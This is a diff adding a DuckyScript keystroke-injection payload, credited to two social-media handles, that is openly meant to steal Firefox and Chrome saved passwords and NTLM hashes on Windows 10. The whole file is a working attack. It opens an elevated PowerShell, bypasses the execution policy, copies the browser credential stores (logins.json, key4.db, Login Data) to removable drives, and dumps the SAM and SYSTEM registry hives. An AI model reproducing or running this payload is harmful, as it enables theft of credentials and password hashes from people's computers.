@@ -1,0 +1,102 @@
+REM This script is written by @mr_qpr n @m3dsec to steal the passwords of Firefox n Chrome n NTLM hash on win10
+REM Tested on "Mozilla Firefox 81.0" & "Google Chrome 85.0.4183.121"
+REM Firefox
+REM This's the part of stealing logins.json n key4.db
+GUI r
+DELAY 400
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 500
+LEFT
+ENTER
+DELAY 300
+STRING Set-ExecutionPolicy bypass -force
+ENTER
+STRING Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
+ENTER
+DELAY 100
+STRING Y
+ENTER
+STRING $firefox_path = "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles"
+ENTER 
+STRING $Target_Files = "$env:USERPROFILE\filelist.txt"
+ENTER
+STRING Get-ChildItem $firefox_path -Recurse | where {$_.Name -eq "logins.json" -OR $_.Name -eq "key4.db" -OR $_.Name -eq "cert9.db"} | % { Write-Output $_.FullName } > $env:USERPROFILE\filelist.txt
+ENTER
+DELAY 100
+STRING foreach ($line in Get-Content $env:USERPROFILE\filelist.txt) { copy-item -Force -Path "$line" -Destination "D:\"}
+ENTER
+DELAY 200
+STRING foreach ($line in Get-Content $env:USERPROFILE\filelist.txt) { copy-item -Force -Path "$line" -Destination "E:\"}
+ENTER
+DELAY 200
+STRING foreach ($line in Get-Content $env:USERPROFILE\filelist.txt) { copy-item -Force -Path "$line" -Destination "F:\"}
+ENTER
+DELAY 200
+STRING Exit
+REM This's the part to get the CMD as Admin
+WINDOWS
+DELAY 100
+STRING CMD
+DELAY 100
+CONTROL-SHIFT ENTER
+DELAY 200
+LEFTARROW
+DELAY 200
+ENTER
+DELAY 200
+REM Chrome
+GUI r
+DELAY 400
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 500
+LEFT
+ENTER
+DELAY 300
+STRING Set-ExecutionPolicy bypass -force
+ENTER
+STRING Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
+ENTER
+DELAY 100
+STRING Y
+ENTER
+STRING $chrome_path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default"
+ENTER 
+STRING $Target_Files = "$env:USERPROFILE\filelist.txt"
+ENTER
+STRING Get-ChildItem $chrome_path -Recurse | where {$_.Name -eq "Login Data"} | % { Write-Output $_.FullName } > $env:USERPROFILE\filelist.txt
+ENTER
+DELAY 100
+STRING foreach ($line in Get-Content $env:USERPROFILE\filelist.txt) { copy-item -Force -Path "$line" -Destination "D:\"}
+ENTER
+DELAY 200
+STRING foreach ($line in Get-Content $env:USERPROFILE\filelist.txt) { copy-item -Force -Path "$line" -Destination "E:\"}
+ENTER
+DELAY 200
+STRING foreach ($line in Get-Content $env:USERPROFILE\filelist.txt) { copy-item -Force -Path "$line" -Destination "F:\"}
+ENTER
+DELAY 200
+STRING Exit
+DELAY 200
+REM This's the part of stealing the NTLM hash
+STRING reg save HKLM\SAM D:\sam
+ENTER
+DELAY 200
+STRING reg save HKLM\SAM E:\sam
+ENTER
+DELAY 200
+STRING reg save HKLM\SAM F:\sam
+ENTER
+DELAY 200
+STRING reg save HKLM\SYSTEM D:\system
+ENTER
+DELAY 200
+STRING reg save HKLM\SYSTEM E:\system
+ENTER
+DELAY 200
+STRING reg save HKLM\SYSTEM F:\system
+ENTER
+DELAY 200
+STRING exit
+ENTER
+DELAY 150
+REM Follow us on https://twitter.com/qpr_mr & https://twitter.com/m3dsec for more
